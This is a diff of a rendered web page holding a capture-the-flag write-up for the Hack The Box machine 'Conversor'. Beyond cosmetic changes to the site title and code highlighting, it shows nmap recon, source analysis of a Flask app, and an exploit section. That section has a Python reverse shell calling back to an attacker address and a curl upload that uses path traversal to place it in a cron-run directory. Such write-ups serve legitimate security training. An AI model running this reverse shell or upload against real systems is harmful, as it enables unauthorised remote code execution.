@@ -3,7 +3,7 @@
   lang="en-us"
   dir="ltr"
   class="scroll-smooth"
-  data-default-appearance="dark"
+  data-default-appearance="one-light"
   data-auto-appearance="true"><head><script src="/bubka/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=bubka/livereload" data-no-instant defer></script>
   <meta charset="utf-8">
   
@@ -15,8 +15,8 @@
 
   
   
-    <title>HTB-Conversor &middot; bubka hack stuff</title>
-    <meta name="title" content="HTB-Conversor &middot; bubka hack stuff">
+    <title>HTB-Conversor &middot; bubka hacks stuff</title>
+    <meta name="title" content="HTB-Conversor &middot; bubka hacks stuff">
   
 
   
@@ -35,7 +35,7 @@
 
   
   <meta property="og:url" content="http://localhost:1313/bubka/writeups/htb-conversor/">
-  <meta property="og:site_name" content="bubka hack stuff">
+  <meta property="og:site_name" content="bubka hacks stuff">
   <meta property="og:title" content="HTB-Conversor">
   <meta property="og:description" content="Difficulty: Easy OS: Linux Date: 2026-01-18 TL;DR # Flask web application vulnerable to path traversal during file uploads. Exploited by uploading Python reverse shell to cron-executed directory → gained www-data shell → extracted MD5 hashes from SQLite database → cracked password for user fismathack → leveraged CVE-2024-48990 in needrestart 3.7 for privilege escalation to root.
 Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)">
@@ -102,8 +102,8 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
   <link
     type="text/css"
     rel="stylesheet"
-    href="/bubka/css/main.bundle.min.4f40feea4c6f59a876576bf0c99d3ffd70a8847b71c25199e21b2f316a6ea95b5fce21b78684be222289fa9c04834d56e10420f50f8f476b9919b94ccc151f28.css"
-    integrity="sha512-T0D&#43;6kxvWah2V2vwyZ0//XCohHtxwlGZ4hsvMWpuqVtfziG3hoS&#43;IiKJ&#43;pwEg01W4QQg9Q&#43;PR2uZGblMzBUfKA==">
+    href="/bubka/css/main.bundle.min.c021e5819c07d4cc5a59e5328c5dd36a5597b7d868fb04bddc32d0c56e6ee89975ed188ec798a5dbff3583fba73e0d15f723602d4c97d468bc8bbc1fddbc49fb.css"
+    integrity="sha512-wCHlgZwH1MxaWeUyjF3TalWXt9ho&#43;wS93DLQxW5u6Jl17RiOx5il2/81g/unPg0V9yNgLUyX1Gi8i7wf3bxJ&#43;w==">
 
   
   
@@ -225,7 +225,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     "keywords": ["web","nmap","CVE-2024-48990","file-upload","path-traversal","needrestart","sqlite"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "892"
+    "wordCount": "924"
   }]
   </script>
 
@@ -259,6 +259,10 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
 
 
 
+  
+    
+  
+
 
 
 
@@ -283,7 +287,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
   
   
     <a href="/bubka/" class="text-base font-medium truncate min-w-0 shrink">
-      bubka hack stuff
+      bubka hacks stuff
     </a>
   
   <div class="flex items-center ms-auto">
@@ -316,7 +320,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
       
       class="flex items-center bf-icon-color-hover"
       aria-label="about"
-      title="bubka hack stuff">
+      title="bubka hacks stuff">
       
       
         <span class="text-base font-medium break-normal">
@@ -444,7 +448,7 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
         
         class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
         
-        <span title="bubka hack stuff" class="text-2xl font-bold tracking-tight">
+        <span title="bubka hacks stuff" class="text-2xl font-bold tracking-tight">
           about
         </span>
         
@@ -489,6 +493,89 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
   
   <article>
     
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+    
+    
+  
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/bubka/mountains1_hu_a249bad53d232748.jpg"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/bubka/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/bubka/mountains1_hu_a249bad53d232748.jpg"></script>
+  
+      
     
 
     
@@ -892,36 +979,36 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     
 </h3>
 <p><code>nmap</code> identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bubka@bubka$ nmap 10.129.4.129 -p- -A --min-rate <span style="color:#a5d6ff">5000</span>
-</span></span><span style="display:flex;"><span>Starting Nmap 7.98 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-19 06:23 -0500
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff7b72">for</span> 10.129.4.129
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.051s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#a5d6ff">65533</span> closed tcp ports <span style="color:#ff7b72;font-weight:bold">(</span>reset<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
-</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>| ssh-hostkey: 
-</span></span><span style="display:flex;"><span>|   <span style="color:#a5d6ff">256</span> 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a <span style="color:#ff7b72;font-weight:bold">(</span>ECDSA<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>|_  <span style="color:#a5d6ff">256</span> 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee <span style="color:#ff7b72;font-weight:bold">(</span>ED25519<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.52
-</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://conversor.htb/
-</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#ff7b72;font-weight:bold">(</span>Ubuntu<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>Device type: general purpose|router
-</span></span><span style="display:flex;"><span>Running: Linux 5.X, MikroTik RouterOS 7.X
-</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
-</span></span><span style="display:flex;"><span>OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 <span style="color:#ff7b72;font-weight:bold">(</span>Linux 5.6.3<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#a5d6ff">2</span> hops
-</span></span><span style="display:flex;"><span>Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#ff7b72;font-weight:bold">(</span>using port 8888/tcp<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>HOP RTT      ADDRESS
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">1</span>   35.97 ms 10.10.14.1
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">2</span>   35.93 ms 10.129.4.129
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 24.69 seconds</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">bubka@bubka$ nmap 10.129.4.129 -p- -A --min-rate <span class="m">5000</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">Starting Nmap 7.98 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-01-19 06:23 -0500
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">Nmap scan report <span class="k">for</span> 10.129.4.129
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">Host is up <span class="o">(</span>0.051s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">Not shown: <span class="m">65533</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="p">|</span>   <span class="m">256</span> 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">80/tcp open  http    Apache httpd 2.4.52
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://conversor.htb/
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">Device type: general purpose<span class="p">|</span>router
+</span></span><span class="line"><span class="ln">15</span><span class="cl">Running: Linux 5.X, MikroTik RouterOS 7.X
+</span></span><span class="line"><span class="ln">16</span><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+</span></span><span class="line"><span class="ln">17</span><span class="cl">OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 <span class="o">(</span>Linux 5.6.3<span class="o">)</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">Network Distance: <span class="m">2</span> hops
+</span></span><span class="line"><span class="ln">19</span><span class="cl">Service Info: Host: conversor.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="ln">20</span><span class="cl">
+</span></span><span class="line"><span class="ln">21</span><span class="cl">TRACEROUTE <span class="o">(</span>using port 8888/tcp<span class="o">)</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">HOP RTT      ADDRESS
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="m">1</span>   35.97 ms 10.10.14.1
+</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="m">2</span>   35.93 ms 10.129.4.129
+</span></span><span class="line"><span class="ln">25</span><span class="cl">
+</span></span><span class="line"><span class="ln">26</span><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="ln">27</span><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 24.69 seconds</span></span></code></pre></div></div>
 <p>I added the host domain to my <code>/etc/hosts file</code>.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ tail -1 /etc/hosts  
-</span></span><span style="display:flex;"><span>10.129.4.129      conversor.htb</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">bubka@bubka$ tail -1 /etc/hosts  
+</span></span><span class="line"><span class="ln">2</span><span class="cl">10.129.4.129      conversor.htb</span></span></code></pre></div></div>
 
 <h3 class="relative group">Website Enumeration
     <div id="website-enumeration" class="anchor"></div>
@@ -988,28 +1075,28 @@ Recon # port scanning # nmap identifies 2 open TCP ports: 22 (SSH) and 80 (HTTP)
     sizes="(min-width: 768px) 50vw, 65vw"
     data-zoom-src="/bubka/writeups/htb-conversor/image3.png"></figure>
 </p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.
-</span></span><span style="display:flex;"><span>├── app.py
-</span></span><span style="display:flex;"><span>├── app.wsgi
-</span></span><span style="display:flex;"><span>├── install.md
-</span></span><span style="display:flex;"><span>├── instance
-</span></span><span style="display:flex;"><span>│   └── users.db
-</span></span><span style="display:flex;"><span>├── scripts
-</span></span><span style="display:flex;"><span>├── static
-</span></span><span style="display:flex;"><span>│   ├── images
-</span></span><span style="display:flex;"><span>│   │   ├── arturo.png
-</span></span><span style="display:flex;"><span>│   │   ├── david.png
-</span></span><span style="display:flex;"><span>│   │   └── fismathack.png
-</span></span><span style="display:flex;"><span>│   ├── nmap.xslt
-</span></span><span style="display:flex;"><span>│   └── style.css
-</span></span><span style="display:flex;"><span>├── templates
-</span></span><span style="display:flex;"><span>│   ├── about.html
-</span></span><span style="display:flex;"><span>│   ├── base.html
-</span></span><span style="display:flex;"><span>│   ├── index.html
-</span></span><span style="display:flex;"><span>│   ├── login.html
-</span></span><span style="display:flex;"><span>│   ├── register.html
-</span></span><span style="display:flex;"><span>│   └── result.html
-</span></span><span style="display:flex;"><span>└── uploads</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">.
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">├── app.py
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">├── app.wsgi
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">├── install.md
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">├── instance
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">│   └── users.db
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">├── scripts
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">├── static
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">│   ├── images
+</span></span><span class="line"><span class="ln">10</span><span class="cl">│   │   ├── arturo.png
+</span></span><span class="line"><span class="ln">11</span><span class="cl">│   │   ├── david.png
+</span></span><span class="line"><span class="ln">12</span><span class="cl">│   │   └── fismathack.png
+</span></span><span class="line"><span class="ln">13</span><span class="cl">│   ├── nmap.xslt
+</span></span><span class="line"><span class="ln">14</span><span class="cl">│   └── style.css
+</span></span><span class="line"><span class="ln">15</span><span class="cl">├── templates
+</span></span><span class="line"><span class="ln">16</span><span class="cl">│   ├── about.html
+</span></span><span class="line"><span class="ln">17</span><span class="cl">│   ├── base.html
+</span></span><span class="line"><span class="ln">18</span><span class="cl">│   ├── index.html
+</span></span><span class="line"><span class="ln">19</span><span class="cl">│   ├── login.html
+</span></span><span class="line"><span class="ln">20</span><span class="cl">│   ├── register.html
+</span></span><span class="line"><span class="ln">21</span><span class="cl">│   └── result.html
+</span></span><span class="line"><span class="ln">22</span><span class="cl">└── uploads</span></span></code></pre></div></div>
 
 <h3 class="relative group">Source code analysis
     <div id="source-code-analysis" class="anchor"></div>
@@ -1025,11 +1112,11 @@ The application is built with Python Flask.
 In app.py i found that XSLT file dont use parser configuration like XLM do.
 no filename sanitization was found in the upload handler, enabling path traversal attacks.</p>
 <p><u>app.py:</u></p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span>
-</span></span><span style="display:flex;"><span>parser <span style="color:#ff7b72;font-weight:bold">=</span> etree<span style="color:#ff7b72;font-weight:bold">.</span>XMLParser(resolve_entities<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">False</span>, no_network<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">True</span>, dtd_validation<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">False</span>, load_dtd<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#79c0ff">False</span>)
-</span></span><span style="display:flex;"><span>xml_tree <span style="color:#ff7b72;font-weight:bold">=</span> etree<span style="color:#ff7b72;font-weight:bold">.</span>parse(xml_path, parser)   
-</span></span><span style="display:flex;"><span>xslt_tree <span style="color:#ff7b72;font-weight:bold">=</span> etree<span style="color:#ff7b72;font-weight:bold">.</span>parse(xslt_path)       <span style="color:#8b949e;font-style:italic"># no parse configuration</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">parser</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">XMLParser</span><span class="p">(</span><span class="n">resolve_entities</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">no_network</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">dtd_validation</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">load_dtd</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">xml_tree</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">xml_path</span><span class="p">,</span> <span class="n">parser</span><span class="p">)</span>   
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="n">xslt_tree</span> <span class="o">=</span> <span class="n">etree</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">xslt_path</span><span class="p">)</span>       <span class="c1"># no parse configuration</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span></span></span></code></pre></div></div>
 <ul>
 <li>resolve_entities=False (prevents the parser from resolving entities into their values)</li>
 <li>no_network=True (prevent making any network requests during XML processing)</li>
@@ -1037,13 +1124,13 @@ no filename sanitization was found in the upload handler, enabling path traversa
 <li>load_dtd=False (prevents loading external DTD)</li>
 </ul>
 <p><code>install.md</code> reveals a cron job that executes all Python scripts in /var/www/conversor.htb/scripts/ every minute.</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span>
-</span></span><span style="display:flex;"><span>You can also run it <span style="color:#ff7b72">with</span> Apache using the app<span style="color:#ff7b72;font-weight:bold">.</span>wsgi file<span style="color:#ff7b72;font-weight:bold">.</span>
-</span></span><span style="display:flex;"><span>If you want to run Python scripts (<span style="color:#ff7b72">for</span> example, our server deletes all files older than <span style="color:#a5d6ff">60</span> minutes to avoid system overload), you can add the following line to your <span style="color:#ff7b72;font-weight:bold">/</span>etc<span style="color:#ff7b72;font-weight:bold">/</span>crontab<span style="color:#ff7b72;font-weight:bold">.</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 &#34;$f&#34;; done
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">...</span>[snip]<span style="color:#ff7b72;font-weight:bold">...</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="n">You</span> <span class="n">can</span> <span class="n">also</span> <span class="n">run</span> <span class="n">it</span> <span class="k">with</span> <span class="n">Apache</span> <span class="n">using</span> <span class="n">the</span> <span class="n">app</span><span class="o">.</span><span class="n">wsgi</span> <span class="n">file</span><span class="o">.</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="n">If</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">run</span> <span class="n">Python</span> <span class="n">scripts</span> <span class="p">(</span><span class="k">for</span> <span class="n">example</span><span class="p">,</span> <span class="n">our</span> <span class="n">server</span> <span class="n">deletes</span> <span class="nb">all</span> <span class="n">files</span> <span class="n">older</span> <span class="n">than</span> <span class="mi">60</span> <span class="n">minutes</span> <span class="n">to</span> <span class="n">avoid</span> <span class="n">system</span> <span class="n">overload</span><span class="p">),</span> <span class="n">you</span> <span class="n">can</span> <span class="n">add</span> <span class="n">the</span> <span class="n">following</span> <span class="n">line</span> <span class="n">to</span> <span class="n">your</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">crontab</span><span class="o">.</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="s2">* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 &#34;$f&#34;; done
+</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span></span></span></code></pre></div></div>
 
 <h2 class="relative group">Exploitation
     <div id="exploitation" class="anchor"></div>
@@ -1056,19 +1143,19 @@ no filename sanitization was found in the upload handler, enabling path traversa
 </h2>
 <p>Attack-Vector: Arbitrary File Upload via Path Traversal to Cron RCE.</p>
 <p>The application does not sanitize filenames properly. I can upload a Python reverse shell and use path traversal (../scripts/) to save it into the directory executed by the cronjob</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bubka@bubka$ cat exploit.py
-</span></span><span style="display:flex;"><span>import socket,subprocess,os
-</span></span><span style="display:flex;"><span><span style="color:#79c0ff">s</span><span style="color:#ff7b72;font-weight:bold">=</span>socket.socket<span style="color:#ff7b72;font-weight:bold">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>s.connect<span style="color:#ff7b72;font-weight:bold">((</span><span style="color:#a5d6ff">&#34;10.10.14.80&#34;</span>,5323<span style="color:#ff7b72;font-weight:bold">))</span> 
-</span></span><span style="display:flex;"><span>os.dup2<span style="color:#ff7b72;font-weight:bold">(</span>s.fileno<span style="color:#ff7b72;font-weight:bold">()</span>,0<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>os.dup2<span style="color:#ff7b72;font-weight:bold">(</span>s.fileno<span style="color:#ff7b72;font-weight:bold">()</span>,1<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>os.dup2<span style="color:#ff7b72;font-weight:bold">(</span>s.fileno<span style="color:#ff7b72;font-weight:bold">()</span>,2<span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>import pty; pty.spawn<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;/bin/bash&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>bubka@bubka$ curl -X POST http://conversor.htb/convert <span style="color:#79c0ff">\
-</span></span></span><span style="display:flex;"><span>  -F <span style="color:#a5d6ff">&#34;xml_file=@exploit.py;filename=../scripts/exploit.py&#34;</span> <span style="color:#79c0ff">\
-</span></span></span><span style="display:flex;"><span>  -F <span style="color:#a5d6ff">&#34;xslt_file=@exploit.py;filename=sex.xsl&#34;</span> <span style="color:#79c0ff">\
-</span></span></span><span style="display:flex;"><span>  -b <span style="color:#a5d6ff">&#34;session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImJ1YmthIn0.aW574A.k5FrGy9C5elqfuPqbua7WiA3Img&#34;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">bubka@bubka$ cat exploit.py
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">import socket,subprocess,os
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="nv">s</span><span class="o">=</span>socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">s.connect<span class="o">((</span><span class="s2">&#34;10.10.14.80&#34;</span>,5323<span class="o">))</span> 
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,0<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,1<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>,2<span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="o">)</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl">bubka@bubka$ curl -X POST http://conversor.htb/convert <span class="se">\
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl">  -F <span class="s2">&#34;xml_file=@exploit.py;filename=../scripts/exploit.py&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl">  -F <span class="s2">&#34;xslt_file=@exploit.py;filename=sex.xsl&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl">  -b <span class="s2">&#34;session=eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImJ1YmthIn0.aW574A.k5FrGy9C5elqfuPqbua7WiA3Img&#34;</span></span></span></code></pre></div></div>
 
 <h2 class="relative group">Shell as www-data
